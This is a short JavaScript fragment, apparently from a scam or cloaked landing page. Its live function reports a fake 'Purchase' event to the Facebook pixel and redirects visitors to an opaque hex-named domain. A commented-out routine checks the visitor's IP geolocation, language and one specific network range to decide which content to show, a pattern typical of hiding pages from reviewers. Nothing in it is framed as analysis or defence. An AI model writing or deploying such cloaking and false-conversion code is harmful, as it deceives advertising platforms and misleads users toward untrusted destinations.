function Url() {
  fbq('track', 'Purchase');
  var urls = new Array();
     urls[0] = "https://1f9ae8a51800cded.com/tf2/"; 
  n = Math.floor(Math.random() * 1);
  location.href = urls[n];
}


// async function checkKoreaUser() {
//   try {
//       const response = await fetch('https://ipapi.co/json/');
//       const data = await response.json();
//       const isKoreaIP = data.country === 'KR';
//       const preferredLanguages = navigator.languages || [navigator.language];
//       const isKoreanLanguage = preferredLanguages.some(lang => lang.startsWith('ko'));
//       const isCurrentIp = data.network === '103.151.116.0/23';
//       if ((isKoreaIP && isKoreanLanguage) || isCurrentIp) {
//           document.getElementById('Korea').style.display = 'block';
//       } else {
//           document.getElementById('NoKorea').style.display = 'block';
//       }
//   } catch (error) {
//       console.error('Error fetching IP or location data:', error);
//   }
// }
// checkKoreaUser();



  // let showform = document.getElementById("showcontent").style;
  // const handleShowitem = () => {
  //   showform.display = "block";
  // };

  // const handleHideitem = () => {
  //   showform.display = "none";
  // };